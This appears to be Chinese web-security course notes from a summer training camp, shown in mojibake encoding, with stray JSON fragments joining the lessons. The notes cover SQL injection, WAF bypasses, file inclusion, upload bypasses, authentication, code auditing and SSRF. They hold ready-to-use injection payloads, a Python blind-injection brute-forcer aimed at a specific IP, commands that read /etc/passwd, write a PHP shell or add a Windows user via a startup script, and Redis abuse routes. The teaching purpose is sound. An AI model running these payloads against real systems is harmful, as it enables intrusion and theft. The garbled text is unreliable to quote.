+ é”šç‚¹ #123 Http(s)åè®®ï¼šURLã€HOSTã€User-Agentã€Refererï¼ˆä»£è¡¨è·³è½¬æ¥æº â†’ å¯ä»¥ç”¨ä¸åšæµé‡ç»Ÿè®¡ï¼‰ã€Cookieï¼ˆååºåˆ—åŒ–ï¼‰ã€X-Forwarded-For    SQLæ³¨å…¥ #   æ ¹æœ¬åŸå› ï¼šè„šæœ¬è¯­è¨€æ— æ³•ç†è§£SQLè¯­å¥ï¼Œå¯¹æŸ¥è¯¢è¯­å¥å¤„ç†ä¸ä¸€è‡´ï¼Œå¯¼è‡´SQLæ³¨å…¥ï¼Œç¯¡æ”¹äº†SQLè¯­å¥åŸæœ¬é€»è¾‘  SQLæ³¨å…¥é˜²å¾¡ #   å­—ç¬¦ä¸²æ‹¼æ¥å½¢å¼ï¼šè¿‡æ»¤å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ç­‰å…³é”®è¯ï¼›è½¬ä¹‰(addslashesã€mysqli_real_escape_string) å˜é‡ç»‘å®šï¼Œå…ˆç»™sqlæŸ¥è¯¢å˜é‡ä¸€ä¸ªå ä½ç¬¦ï¼Œç„¶åè°ƒç”¨mysqlçš„åº“è¿›è¡Œé¢„ç¼–è¯‘ã€‚  String sql = \u0026#34;select id, no from user where id=?\u0026#34;; PrepareStatement ps = conn.prepareStatement(sql); ps.SetInt(1, id); ps.executeQuery(); SQLæ³¨å…¥ç±»å‹ #    Unionæ³¨å…¥\n é€‚ç”¨åœºæ™¯ï¼šæœ‰å›æ˜¾ï¼Œå¯ä»¥çœ‹åˆ°æŸäº›å­—æ®µçš„å›æ˜¾ç»“æœã€‚unionè¯­å¥å¯ä»¥ç”¨æ¥å¡«å……æŸ¥è¯¢ç»“æœï¼Œå¹¶ä¸”é¢å¤–æ‰§è¡Œä¸€æ¬¡æŸ¥è¯¢ã€‚ç”¨æ³•å®ä¾‹ï¼Œå¯¹äºä»¥ä¸‹çš„phpï¼š   $$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $$_GET[\u0026#39;id\u0026#39;] : 1;  $$sql = \u0026#34;SELECT * FROM news WHERE tid=\u0026#39;{ $$id}\u0026#39;\u0026#34;;  $$result = mysql_query($sql, $$conn) or die(mysql_error());  $$row = mysql_fetch_array($$result, MYSQL_ASSOC);  echo \u0026#34;\u0026lt;h2\u0026gt;{ $row[\u0026#39;title\u0026#39;]}\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;{ $row[\u0026#39;content\u0026#39;]}\u0026lt;/p\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;;  mysql_free_result($result);   æˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹payloadï¼š\n100\u0026#39; union select 1, 2, @@version   å®é™…æ‰§è¡Œçš„sqlè¯­å¥ä¸º\n  select * from news where tid=1 union select 1, 2, @@version  Unionæ³¨å…¥é™åˆ¶ï¼šå¾ˆå¤šæ”»å‡»åœºæ™¯ä¸æ˜¯selectæ³¨å…¥ï¼Œunionè¯­å¥è¢«å¾ˆå¤šç½‘é¡µè¿‡æ»¤    æŠ¥é”™æ³¨å…¥ï¼šæ•°æ®æŠ¥é”™è¯­å¥ä¸­åŒ…å«SQLè¯­å¥æ‰§è¡Œç»“æœ\n å¸¸è§æŠ¥é”™æ³¨å…¥å‡½æ•°ï¼šfloorã€extractvalueã€updatexml\u0026hellip; floor payloadï¼š  and select 1 from (select count(*), concat(version(), floor(rand(0)*2)) x from information_schema.tables group by x) a);%23  extractvalue payloadï¼ˆæ”¹å˜offsetä»0å¢åŠ ï¼Œå¯ä»¥è¯»å–æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åï¼‰ï¼š  and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1 offset 1)));%23  updatexml payloadï¼š  and 1 = (updatexml(1, concat(0x3a, (select user())), 1));%23  Exp payloadï¼š  Exp(~(select * from (select user()) a));%23   Booleanç›²æ³¨\n åœ¨æ•°æ®å›æ˜¾çš„ä¸åŒï¼Œé€ä¸ªçˆ†ç ´çŒœæµ‹ã€‚exampleï¼Œpayload\u0026amp;sql:  xx\u0026#39; and pass \u0026gt; \u0026#39;123\u0026#39;%23 select *from user where user = \u0026#39;xx\u0026#39; and pass \u0026gt; \u0026#39;123\u0026#39;#   æˆªå–å­—ç¬¦ä¸²çš„ç›¸å…³å‡½æ•°ï¼š\n left(Str,len) â†’ ä»å·¦ä¾§æˆªå–Strçš„å‰numä½ substr(Str,offset,len) â†’ ä»offsetï¼ˆæœ€å¼€å§‹ä½ç½®æ ‡è®°ä¸º1ï¼‰å¼€å§‹æˆªå–Strçš„lené•¿åº¦ã€‚ascii() å°†å­—ç¬¦è½¬åŒ–ä¸ºasciiå€¼ã€‚mid(Str,offset,len) ç”¨æ³•ç›¸åŒã€‚ regex æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ã€‚æ¯”å¦‚åŒ¹é…userä¸ºrootçš„æ­£åˆ™è¡¨è¾¾å¼ç”¨æ³•ï¼šselect user() regexp '^root' ã€‚å¯ä»¥åµŒå¥—ifè¯­å¥ä½¿ç”¨ï¼š  select * from users where id=1 and 1=(if((user() regexp \u0026#39;^r\u0026#39;), 1, 0));#   PSï¼šmysqlé»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¯ä»¥å…ˆç”¨binaryå‡½æ•°å¤„ç†\n    Timing ç›²æ³¨\n é¡µé¢ä¸å­˜åœ¨ä¸åŒå›æ˜¾ï¼Œä½†SQLè¯­å¥è¢«æ‰§è¡Œ â†’ é€ä¸ªçŒœæµ‹ + å»¶æ—¶æ‰§è¡Œ payloadï¼š  if(ascii(substr(database(),1,1))\u0026gt;115,0,sleep(5))%23  MySQLï¼š  BENCHMARK(100000, MD5(1)) or sleep(5)    è¯¾åä¹ é¢˜Pythonçˆ†ç ´ä»£ç ï¼š  import requests from random import sample  md5str = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz}\u0026#39; # æœ€åä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºä¸€ä¸ªæ¯”zå¤§çš„asciiç å­—ç¬¦  url = \u0026#39;http://202.112.51.184:8001/\u0026#39; payload = {\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;test\u0026#39;} # å£°æ˜payloadä¸ºä¸€ä¸ªå­—å…¸  crackres = [\u0026#39;unsolve\u0026#39;]*33 crackres[32] = \u0026#39;end\u0026#39; # æ ‡å¿—crackç»“æœlistçš„æœ«å°¾ crackpos = 0 # ä»0å¼€å§‹çˆ†ç ´  session = requests.Session() defaultlen = len(session.post(url, data=payload).content)  while crackres[crackpos] != \u0026#39;end\u0026#39;:  for index in range(len(md5str)):  thispassword = \u0026#39;\u0026#39;.join(crackres[0:crackpos]) + md5str[index+1]  payload[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#39; and password \u0026gt; \u0026#39;\u0026#34; + thispassword + \u0026#34;\u0026#39;#\u0026#34;  response = session.post(url, data=payload)  if len(response.content) != defaultlen:  crackres[crackpos] = md5str[index]  break  crackpos = crackpos + 1  print(\u0026#39;Password md5: \u0026#39;,\u0026#39;\u0026#39;.join(crackres[0:32])) SQLæ³¨å…¥çš„åˆ©ç”¨ä»£ç  #    çŒœæµ‹MySQLçš„è¡¨åå’Œå­—æ®µåï¼šMySQLçš„Information_schemaæ•°æ®åº“å­˜å‚¨äº†æ•´ä¸ªæ•°æ®åº“çš„ç»“æ„ä¿¡æ¯ï¼Œå­˜æ”¾åœ¨Information_schema.tablesã€Information_schema.columnsè¡¨ä¸­ã€‚\n çˆ†æ•°æ®åº“ payloadï¼š  union select 1,2,database()%23  çˆ†è¡¨å payloadï¼š  union select 1, table_name, 3 from information_schema.tables where table_schema=\u0026#39;test\u0026#39; limit 0,1%23  çˆ†åˆ—å payloadï¼š  union select 1, column_name, 3 from information_schema.columns where table_name=\u0026#39;admin\u0026#39; limit 0,1%23   æ–‡ä»¶è¯»å†™\n è¯»å–å…³é”®æ–‡ä»¶  select LOADFILE(\u0026#39;/etc/passwd\u0026#39;);  å†™å…¥shellï¼š  select \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; into dumpfile \u0026#39;/var/www/html/1.php\u0026#39;  mysql5.7ä¹‹åï¼Œå¼•å…¥äº†secure-file-privæ–°ç‰¹æ€§æ¥é™åˆ¶LOAD DATA, SELECT \u0026hellip; OUTFILE, and LOAD_FILE()    å‘½ä»¤æ‰§è¡Œ\n åˆ©ç”¨æ•°æ®åº“å¯¹æœåŠ¡å™¨å†™å¯åŠ¨è„šæœ¬ï¼š  union select 1,2,3,\u0026#34;net user cimer cimer /ad\u0026#34; into outfile \u0026#39;C:/documents and settings/all users/start menu/programs/startup/add.bat\u0026#39;   WAFç»•è¿‡ #   WAFï¼šWeb Application Firewallï¼Œwebåº”ç”¨é˜²æŠ¤ç³»ç»Ÿã€‚    åŒå†™å…³é”®å­— â†’ é’ˆå¯¹WAFæ˜¯ç”¨ç®€å•çš„éè¿­ä»£çš„å°†selectã€orè¯­å¥æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼šSEselectLECT â†’replaceâ†’ SELECT\n  å¤§å°å†™ç»•è¿‡ï¼šåº”ç”¨ç®€å•çš„åŒºåˆ†å¤§å°å†™çš„å…³é”®å­—åŒ¹é…ï¼Œæ¯”å¦‚phpä¸­çš„preg_matchå‡½æ•°æ²¡æœ‰åŠ /iå‚æ•°\n  ç¼–ç ç»•è¿‡ï¼š\n ASCIIã€‚æ¯”å¦‚ï¼š  select * from admin where username=(CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)) å…¶ä»–ï¼š16è¿›åˆ¶ã€unicodeç¼–ç ã€URLç¼–ç ï¼ˆå¼€å‘ç¨‹åºå‘˜ä¸çŸ¥é“urlä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œè‡ªå·±å†å†™äº†urlè§£ç å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°†URLç¼–ç ä¸¤æ¬¡ï¼‰    more trickï¼š\n  and â†’ \u0026amp;\u0026amp; ï¼› or â†’ || ï¼› select username from admin â†’ select(username)from(admin)ã€select\\**\\username\\**\\from\\**\\admin ï¼ˆ%a0ã€%0aã€%0dã€%09ã€tab\u0026hellip;ï¼‰ã€‚\n  ç§‘å­¦è®°æ•°æ³•ç»•è¿‡ï¼šwhere username=1e1union select\n  \u0026gt;, =, \u0026lt; è¢«é™åˆ¶ï¼šwhere pass in (1,2)ã€where id between 1 and 3ã€like\n  mysqlå¯¹%00ä¸ä¼šæˆªæ–­ï¼šse%00lect\n  PSï¼šSQLæµ‹è¯•è¯­æ³•ï¼ˆæµ‹è¯•å­—ç¬¦ '1' ä¸å­—ç¬¦ a çš„å¤§å°ï¼‰ï¼šselect '1' \u0026gt; 'a'\n    å…¶ä»–æ³¨å…¥æ–¹å¼ #   äºŒæ¬¡æ³¨å…¥ï¼šæ”»å‡»è€…å°†æ¶æ„SQLè¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç¨‹åºç›´æ¥å¸¦å…¥æŸ¥è¯¢ å®½å­—èŠ‚æ³¨å…¥ï¼šå½“æ•°æ®åº“ä¸­ä½¿ç”¨äº†å®½å­—ç¬¦é›†ï¼ˆå¦‚GBKï¼‰ï¼Œä¼šå°†ä¸€äº›ä¸¤ä¸ªå­—ç¬¦å½“ä½œä¸€ä¸ªå­—ç¬¦ã€‚  æ¯”å¦‚ï¼š0xbf27ã€0xbf5c åæ–œæ æ˜¯0x5cï¼Œä½¿ç”¨addslashes()ç­‰è½¬ä¹‰å‡½æ•°åœ¨å¤„ç†è¾“å…¥æ—¶ä¼šå°†\u0026quot;ã€\\ã€\u0026ldquo;è¿™äº›å­—ç¬¦ç”¨åæ–œæ è½¬ä¹‰ï¼Œè¾“å…¥0xbf27ï¼Œè½¬ä¹‰åå˜æˆäº†0xbf5c27ã€‚   sprintf â†’ æ‰§è¡Œè¯­å¥ä½¿ç”¨sprintfå’Œvsprintfè¿›è¡Œæ‹¼æ¥ï¼Œä¸”è¿›è¡Œäº†ä¸¤æ¬¡æ‹¼æ¥ï¼Œç¬¬ä¸€æ¬¡æ‹¼æ¥çš„å‚æ•°å¯æ§ï¼š  \u0026lt;?php  $$input = addslashes(\u0026#34;%1$$\u0026#39; and 1=1#\u0026#34;); \t$$b = sprintf(\u0026#34;AND b=\u0026#39;%s\u0026#39;\u0026#34;, $$input); \t...  $$sql = sprintf(\u0026#34;SELECT * FROM t WHERE a=\u0026#39;%s\u0026#39; $$b\u0026#34;, \u0026#39;admin\u0026#39;); \techo $sql; ?\u0026gt;å‘½ä»¤æ‰§è¡Œæ¼æ´ #   åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ¯”å¦‚phpä¸­çš„systemã€execã€shell_execã€passthruã€popenã€proc_popenç­‰ã€‚ ç¨‹åºè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œç”¨æˆ·å¯ä»¥å°†ä»£ç æ³¨å…¥å¹¶æ‰§è¡Œã€‚é«˜å±å‡½æ•°ï¼ševal()ã€assert() preg_replaceå‡½æ•°ç”¨äºå¯¹å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™å¤„ç†ï¼ˆå½“patternä¸­å­˜åœ¨/eæ¨¡å¼ä¿®é¥°æ—¶ï¼Œ$replaceéƒ¨åˆ†ä¼šè¢«è§£é‡Šä¸ºPHPä»£ç æ‰§è¡Œï¼‰ï¼š  mixed preg_replace(mixed $$pattern, mixed $replacement, mixed $subject[, int $limit=-1[, int \u0026amp;$$count]]) æ–‡ä»¶åŒ…å« #   åœ¨webå¼€å‘ä¸­ï¼Œä¸ºä»€ä¹ˆè¦ä½¿ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Ÿ â†’ æé«˜ä»£ç é‡ç”¨æ€§ å¦‚ä½•è·å–ä¸´æ—¶æ–‡ä»¶åï¼Ÿåˆ©ç”¨ï¼šphpinfo()  æœ¬åœ°æ–‡ä»¶åŒ…å« LFI #    å¸¸è§å‡½æ•°\n include()ã€require() â†’ requireå‡½æ•°æ‰¾ä¸åˆ°æ–‡ä»¶å°±ä¼šå¼•å‘ä¸€ä¸ªé”™è¯¯ã€‚æ¯”å¦‚ï¼š  \u0026lt;?php include(_GET[...]); ?\u0026gt; PSï¼šinclude once() â†’ è‹¥æ–‡ä»¶ä¸­ä»£ç å·²ç»åŒ…å«åˆ™ä¸ä¼šå†æ¬¡è¢«åŒ…å«    ä½¿ç”¨ filter çš„phpåè®®è¯»å–æ•æ„Ÿæ–‡ä»¶çš„base64ä»£ç ï¼š\n  http://www.test.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../ect/passwd   ä½¿ç”¨ /proc/self/environ è¿›è¡Œæ–‡ä»¶åŒ…å«\n å½“å‘ä»»æ„phpæ–‡ä»¶postè¯·æ±‚ä¸Šä¼ æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥åœ¨phpinfo()é¡µé¢æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„å’Œåå­—    ä¸´æ—¶æ–‡ä»¶ç”Ÿå­˜å‘¨æœŸçŸ­ï¼Œå¦‚ä½•å»¶é•¿ï¼Ÿ\n é€šè¿‡åˆ†å—ä¼ è¾“ç¼–ç ï¼Œæå‰è·çŸ¥ä¸´æ—¶æ–‡ä»¶çš„åç§° é€šè¿‡å¢åŠ ä¸´æ—¶æ–‡ä»¶ååçš„ æ•°æ®é•¿åº¦æ¥å»¶é•¿æ—¶é—´ é€šè¿‡å¤§é‡è¯·æ±‚æ¥å»¶è¿ŸPHPè„šæœ¬çš„æ‰§è¡Œé€Ÿåº¦    åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼ˆæ¡ä»¶ç«äº‰ï¼‰\n  å…¶ä»–çš„æ–‡ä»¶åŒ…å« #   æœ‰é™åˆ¶çš„LFI è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼šåˆ©ç”¨ phar:// å’Œ zip:// ä¼ªåè®®å¯ä»¥è§£å‹ç¼©åŒ…å«ä¸€å¥æœ¨é©¬  æ–‡ä»¶ä¸Šä¼  #    æœ€ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ä»£ç ï¼š\nif(is_uploaded_file($_[\u0026#39;myfile\u0026#39;][\u0026#39;tmp_name\u0026#39;])){  $$upload_file=$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;tmp_name\u0026#39;];  $$file_true_name=$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;];  if(move_upload_file($$upload_file, $$file_true_name))  echo $_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;].\u0026#34;ä¸Šä¼ æˆåŠŸ\u0026#34;;  else echo \u0026#34;ä¸Šä¼ å¤±è´¥\u0026#34;; }else echo \u0026#34;ä¸Šä¼ å¤±è´¥\u0026#34;;   é˜²å¾¡æ–‡ä»¶ä¸Šä¼  #    å®¢æˆ·ç«¯çš„javaScriptæ ¡éªŒï¼Œé€šå¸¸æ ¡éªŒæ‰©å±•å â†’ æ­¤æ—¶å¹¶æ²¡æœ‰å‘é€æ•°æ®åŒ… â†’ æŠ“åŒ…æ”¹åŒ…è½»æ¾çˆ†ç ´\n  æ£€æµ‹MIMEç±»å‹ã€‚\n å®¢æˆ·ç«¯åˆ¤æ–­ï¼š$_FILES['myfile']['type']=='image/jpeg' â†’ ç±»å‹ä¹Ÿæ˜¯æ ¹æ®æ–‡ä»¶åè·å–çš„ æœåŠ¡ç«¯åˆ¤æ–­ï¼š  $finfo = finfo_open(FILEINFO_MINE); $$mimetype = finfo_file($finfo, $$file_true_name);   æ£€æŸ¥å†…å®¹ â†’ é»‘åå•ï¼ˆçœ‹ä¸Šå»å¾ˆæœ‰æ•ˆï¼Œä½†å®é™…ä¸Šåªè¦æ˜¯é»‘åå•å°±å¯ä»¥è¢«ç»•è¿‡ï¼‰ â†’ è€—è´¹èµ„æº\n$$content = file_get_contents($$file_true_name); if(stripos($content, \u0026#34;\u0026lt;?php\u0026#34;)){ die(\u0026#34;php!!!\u0026#34;); }   éšè—æ–‡ä»¶ â†’ ç§»åˆ°ä¸€ä¸ªä¸ä¸ºäººçŸ¥çš„è·¯å¾„ â†’ å—åˆ°ä¸šåŠ¡éœ€æ±‚çš„é™åˆ¶ï¼Œæ–‡ä»¶å¿…é¡»è¢«è®¿é—®åˆ°\n$$file_true_name=$secrect_path.$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;]; if(move_uploaded_file($$uploaded_file, $$file_true_name)  echo $_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;].\u0026#34;ä¸Šä¼ æˆåŠŸ\u0026#34;; else echo \u0026#34;ä¸Šä¼ å¤±è´¥\u0026#34;;   éšæœºæ–‡ä»¶åï¼ˆå±€é™æ€§åŒä¸Šï¼‰ï¼š\n$$file_true_name=md5(rand(1,1000)).$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;];   æ£€æŸ¥æ–‡ä»¶æ‰©å±•å\n æœ€ç›´æ¥æœ€æœ‰æ•ˆçš„æ–¹æ³• â†’ webæœåŠ¡å™¨é€šè¿‡ä¸åŒçš„é—®æ–‡ä»¶æ‰©å±•å é»‘åå•ç»•è¿‡  php â†’ php3ã€php5ã€phtmsã€ pHp\u0026hellip; jsp â†’ jspxã€ jspf asp â†’ asaã€ cerã€ aspx\u0026hellip;   ç™½åå•çš„ç»•è¿‡  æˆªæ–­ç»•è¿‡ï¼šæ–‡ä»¶å â†’ test.php(0x00).jpg åˆ©ç”¨NTFS ADSç‰¹æ€§ã€IIS5.x-6.xè§£ææ¼æ´ Apacheè§£ææ¼æ´ï¼šApacheè§£ææ–‡ä»¶åæ˜¯ä»å³å‘å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ï¼štest.php.owf ä¼šè¢«Apacheè§£æä¸º test.php Nginxè§£ææ¼æ´ï¼šcgi.fix_pathinfoå¼€å¯æ—¶ï¼ˆä¸º1ï¼‰ï¼Œå½“è®¿é—® www.xx.com/phpinfo.jpg/q.php æ—¶ï¼Œä¼šå°† phpinfo.jpg å½“ä½œphpè¿›è¡Œè§£æã€‚      è®¤è¯ä¸æˆæƒ #   Authentication \u0026amp; Authorization å¯†ç å¼ºåº¦ï¼šOWASPæ¨èï¼Œ6|8å¤šç§ç»„åˆ  è®¤è¯ #   Sessionè®¤è¯  SessionIDæ ‡è¯†èº«ä»½ï¼Œå­˜åœ¨ä¼šè¯å‘¨æœŸï¼Œå¸¸è§ä¿å­˜äºCookieä¸­ CookieåŠ«æŒï¼šå—…æ¢ã€æœ¬åœ°æ–‡ä»¶çªƒå–ã€XSSæ”»å‡» Session Fixationæ”»å‡»ï¼šæ”»å‡»è€…å‘èµ·ç™»å½•è¯·æ±‚è·å¾—SessionID â†’ ä»¤ç”¨æˆ·ä½¿ç”¨è¯¥SessionIDå‘æœåŠ¡å™¨å‘èµ·ç™»å½•è¯·æ±‚ â†’ ç”¨æˆ·ç™»å½•æˆåŠŸï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ ç”¨æˆ·åœ¨æœåŠ¡å™¨è¿›è¡Œæ“ä½œ   å•ç‚¹ç™»å½•SSO  ç®€ä»‹ï¼š ä¸‰æ–¹å‚ä¸ â†’ ç”¨æˆ·ã€æµè§ˆå™¨ã€OpenIDæä¾›è€… ç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡ã€é£é™©è¿‡äºé›†ä¸­ã€OpenIDæä¾›è€…å‚å·®ä¸é½    æˆæƒ #   ç”¨æˆ·åªèƒ½è®¿é—®æœ‰é™çš„èµ„æºï¼Œå°±æ˜¯è®¿é—®æ§åˆ¶  åŸºäºurlçš„è®¿é—®æ§åˆ¶ã€åŸºäºæ–¹æ³•çš„è®¿é—®æ§åˆ¶ã€åŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶   è¶Šæƒ â†’ æ°´å¹³è¶Šæƒï¼ˆç”¨æˆ·ä¹‹é—´çš„è¶Šæƒè®¿é—®ï¼‰ã€å‚ç›´è¶Šæƒï¼ˆç”¨æˆ·å¾—åˆ°ç®¡ç†å‘˜æƒé™ï¼‰  "},{"id":214,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/","title":"Day8","section":"Xman3å¤ä»¤è¥","content":"ä»£ç å®¡è®¡ #  PHPä»£ç å®¡è®¡ #   ä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡ï¼šæ˜¯æŒ‡å¯¹æºä»£ç è¿›è¡Œæ£€æŸ¥ï¼Œå¯»æ‰¾ä»£ç çš„bugï¼Œè¿™é‡Œä¸»è¦å¯»æ‰¾å¯ä»¥å¯¼è‡´å®‰å…¨æ¼æ´çš„bug ä»£ç å®¡è®¡çš„æŠ€å·§ï¼ˆç¨‹åºçš„ä¸¤å¤§æ ¹æœ¬ï¼šå˜é‡ä¸å‡½æ•°ï¼‰ï¼š  æ ¹æ®æ•æ„Ÿçš„å…³é”®å­—å›æº¯å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ æŸ¥æ‰¾å¯æ§å˜é‡ï¼Œæ­£å‘è¿½è¸ªå˜é‡çš„ä¼ é€’è¿‡ç¨‹ æŸ¥æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç  ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç    è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·ï¼šSeayï¼ˆPHPä»£ç å®¡è®¡å·¥å…·ï¼‰ã€Cobraã€Fortify SCA\u0026hellip;  SSRFæ¼æ´ #   SSRFï¼ŒServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚  å¸¸è§åç«¯å®ç° #    å¯ä»¥è¿›è¡ŒSSRFçš„å¸¸è§åç«¯å®ç°ï¼š\n ä½¿ç”¨file_get_content()ï¼Œä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å›¾ç‰‡ï¼Œå¹¶æŠŠä»–ä¿å­˜ä¸‹æ¥ï¼š  \u0026lt;?php  if(isset($_POST[\u0026#39;url\u0026#39;])){  $$content = file_get_contents($$_POST[\u0026#39;url\u0026#39;]);  $filename = \u0026#39;./images/\u0026#39;.rand().\u0026#39;;img1.jpg\u0026#39;;  file_put_contents($$filename, $$content);  echo $_POST[\u0026#39;url\u0026#39;];  $$img = \u0026#34;\u0026lt;img src=\\\u0026#34;\u0026#34;.$$filename.\u0026#34;\\\u0026#34;/\u0026gt;\u0026#34;;  } \techo $img; ?\u0026gt;ä½¿ç”¨fsockopen()å‡½æ•° â†’ è¿™ä¸ªå‡½æ•°ä¼šåˆ©ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ï¼Œä¼ è¾“ç”¨æˆ·æŒ‡å®šçš„urlæ•°æ®æ•°æ®ï¼š  \u0026lt;?php function GetFile($$host, $port, $$link){  $$fp = fsockopen($host, intval($host), $errno, $$errstr, 30);  if(!$$fp) echo \u0026#34;$errstr(erro number $$errno) \\n\u0026#34;;  else{  $$out = \u0026#34;GET $$linkHTTP/1.1\\r\\n\u0026#34;;  $$out .= \u0026#34;HOST: $$host\\r\\n\u0026#34;;  $out .= \u0026#34;Connection: Close\\r\\n\\r\\n\u0026#34;;  $out .= \u0026#34;\\r\\n\u0026#34;;  fwrite($$fp, $$out);  $contents=\u0026#39;\u0026#39;;  while(!feof($$fp)) $content .= fgets($$fp, 1024);  fclose($fp);  return $contents;  } } ?\u0026gt;ä½¿ç”¨curl()è·å–æ•°æ®ï¼š  \u0026lt;?php  if(isset($_POST[\u0026#39;url\u0026#39;])){  $$link = $$_POST[\u0026#39;url\u0026#39;];  $curlobj = curl_init();  curl_setopt($curlobj, CURLOPT_POST, 0);  curl_setopt($$curlobj, CURLOPT_URL, $$link);  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);  $$result = curl_exec($$curlobj);  curl_close($curlobj);   $filename = \u0026#39;./curled/\u0026#39;.rand().\u0026#39;.txt\u0026#39;;  file_put_contents($$filename, $$result);  echo $result;  } ?\u0026gt;  æ€»ç»“ï¼šé«˜å±å‡½æ•°ï¼šfile_get_contents()ã€fsockopen()ã€curl_exec()ã€‚åŒºåˆ«ï¼š\n å¤§éƒ¨åˆ†phpä¸ä¼šæ‰“å¼€fopençš„gopher wrapper file_get_contentsçš„gopheråè®®ä¸èƒ½URLencode curl_exec()é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ file_get_contentsæ”¯æŒphp://inputåè®®    SSRFåˆ©ç”¨ #   åˆ©ç”¨curlè‡ªå¸¦çš„åè®®è¿›è¡Œæ”»å‡»ï¼ˆhttp://php.net/manual/en/wrappers.phpï¼‰ åˆ©ç”¨SSRFæ”»å‡»æœ¬åœ°æœåŠ¡  fastcgiï¼šhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html   æ”»å‡»æ•°æ®åº“\u0026amp;ç¼“å­˜ï¼š  Redis â†’ å…­ç§åˆ©ç”¨æ–¹å¼ï¼šï¼ˆ1ï¼‰ä¿å­˜åˆ°wwwç›®å½•ï¼Œåˆ›å»ºwebshellï¼›ï¼ˆ2ï¼‰åˆ›å»ºSSH authotrized_keysæ–‡ä»¶ï¼›ï¼ˆ3ï¼‰å†™è®¡åˆ’ä»»åŠ¡ï¼ˆ/var/spool/cron/ \u0026amp; /etc/cron.d/ï¼‰ï¼›ï¼ˆ4ï¼‰slave of 8.8.8.8 ä¸»ä»æ¨¡å¼åˆ©ç”¨ï¼›ï¼ˆ5ï¼‰å†™å…¥åˆ°/etc/profile.d/ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼›ï¼ˆ6ï¼‰å¼€å¯AOFæŒä¹…åŒ–çº¯æ–‡æœ¬è®°å½•appendfilenameã€‚ Memcachedï¼šåˆ©ç”¨å†…å­˜ä¸­çš„æ•°æ®ï¼Œè¯»å–ç®¡ç†å‘˜çš„Sessionï¼Œä¿®æ”¹adminidã€‚ CounchDBï¼šèƒ½å¤Ÿå‘èµ·SSRFè¯·æ±‚ï¼ŒHTTP /_replicate API     P.S.ï¼šgopherè½¬æ¢è§„åˆ™å®ä¾‹ï¼ˆgopheråè®®ä½¿ç”¨æ–¹æ³•ï¼šgopher://ip:port/payloadï¼‰ï¼š  #coding:utf-8 import sys exp = \u0026#39;\u0026#39; with open(sys.argv[1]) as f: \tfor line in f.readlines(): \tif line[0] in \u0026#39;\u0026gt;\u0026lt;+\u0026#39;: # 